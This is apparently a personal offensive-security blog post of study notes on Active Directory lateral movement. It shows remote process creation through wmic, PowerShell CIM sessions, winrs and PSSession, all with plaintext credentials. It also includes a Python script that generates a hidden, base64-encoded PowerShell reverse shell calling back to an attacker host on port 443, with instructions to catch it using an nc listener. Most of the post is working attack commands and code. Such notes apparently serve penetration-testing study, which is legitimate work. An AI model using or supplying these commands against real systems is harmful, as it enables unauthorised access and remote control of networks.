---
layout: post
title: Active Directory Lateral Movement
titledate: 09/29/23
tags: ["infosec", "offsec", "AD", "powershell"]
---

#### lateral with wmi and winrm

#### wmi

here we use wmic to create a process

    C:> wmic /node:192.168.1.1 /user:jim /password:pass123! process call create "calc"

replicating the same attack in powershell

```powershell
$username = 'jim';
$password = 'pass123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.1.1 -Credential $credential -SessionOption $Options 
$command = 'calc';
```

    PS> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

to create a reverse shell we can ditch the calc and insert our useable shellcode

the following is a python script that creates a reverse shell in powershell and base64 encodes it

```python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.2.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```
when run this script will print the powershell command that can be added to the $command = part above 

now when we edit the ip and open a nc listener on 443 we will get a reverse shell

#### winrm

another remote management 

winrm only works for domain users and sends xml over 5985 and 5986 http/https

    C:> winrs -r:files04 -u:jen -p:pass123!  "cmd /c hostname & whoami" 

to execute our reverse shell we just addthe powershell -nop -w hidden -e reverseshellbase64

powershell also has winrm functionality

    PS:shawn> $username = 'jim';
    PS> $password = 'pass123!';
    PS> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
    PS> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
    PS> New-PSSession -ComputerName 192.168.1.1 -Credential $credential

so now we can enter the newly created session

    PS> Enter-PSSession 1
    PS:jim>

### NOTE: powershell seems to work better

